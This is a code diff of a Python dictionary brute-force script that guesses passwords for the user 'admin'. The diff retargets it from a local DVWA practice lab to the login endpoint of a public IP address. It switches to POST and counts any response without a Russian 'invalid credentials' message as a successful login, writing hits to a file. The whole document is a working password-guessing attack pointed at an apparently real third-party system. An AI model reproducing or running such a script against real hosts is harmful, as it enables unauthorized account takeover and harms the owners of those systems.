@@ -4,17 +4,15 @@ import logging
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
 # Target URL
-url = "http://localhost:4280/vulnerabilities/brute/"
+# url = "http://localhost:4280/vulnerabilities/brute/"
+url = "http://80.80.218.155/admin/login_check"
 
-# Headers to mimic a real browser request
 headers = {
-    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Referer": "http://localhost:4280/vulnerabilities/brute/",
-    "Cookie": "csrftoken=JVPHuff7L4DcaWmrc2WJvPLgKirKBulT; language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=f131b6432653bbc6694fad8ed101b7ff; security=low"
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+    "Referer": "http://80.80.218.155/admin/",
 }
 
 
-# Function to perform brute force attack
 def brute_force(username, password_file):
     with open(password_file, 'r') as file:
         passwords = file.read().splitlines()
@@ -28,11 +26,11 @@ def brute_force(username, password_file):
             "Login": "Login"
         }
 
-        # Send the GET request
-        response = requests.get(url, headers=headers, params=params)
+        response = requests.post(url, headers=headers, params=params)
 
         # Check if login was successful
-        if "Welcome to the password protected area" in response.text:
+        # Недействительные аутентификационные данные.
+        if not "Недействительные аутентификационные данные." in response.text:
             msg = f"[{i}][+] Success! Username: {username}, Password: {password}"
             logging.info(msg)
             with open("result.txt", 'w') as file:
@@ -47,6 +45,6 @@ def brute_force(username, password_file):
 
 if __name__ == "__main__":
     username = "admin"
-    password_file = "source/dictionary/pwd_121_rnd.txt"
+    password_file = "/mnt/ntfs/csec/attack-practice/brute force/script.txt"
 
     brute_force(username, password_file)
